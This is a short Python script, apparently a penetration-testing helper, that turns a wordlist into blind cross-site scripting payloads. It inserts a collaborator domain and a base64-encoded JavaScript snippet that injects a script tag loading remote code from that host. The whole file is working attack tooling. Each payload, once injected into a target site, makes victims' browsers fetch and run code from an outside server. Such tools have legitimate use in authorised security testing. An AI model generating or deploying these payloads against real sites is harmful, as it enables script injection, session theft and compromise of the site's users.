import sys
import base64

def build_blind_xss_wordlist(wordlist, domain_collab):
    blind_xss_list = []
    with open(wordlist, "r") as payloads:
        for payload in payloads:
            if "BASE_64_PAYLOAD_PLACEHOLDER" in payload:
                replacement = (base64.b64encode(b'var a=document.createElement("script");a.src="http://'+domain_collab.encode("utf-8")+b'";document.body.appendChild(a);')).decode('utf-8')
                blind_xss_list.append(payload.replace("BASE_64_PAYLOAD_PLACEHOLDER",replacement))
            else:
                blind_xss_list.append(payload.replace("domain_collab",domain_collab))
    return blind_xss_list


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python blind_xss_gen.py wordlist_path domain_collab")
        sys.exit(1)
    wordlist_path = sys.argv[1]
    domain_collab = sys.argv[2]
    blind_xss_list = build_blind_xss_wordlist(wordlist_path, domain_collab)
    
    for e in blind_xss_list:
        print(e, end="")
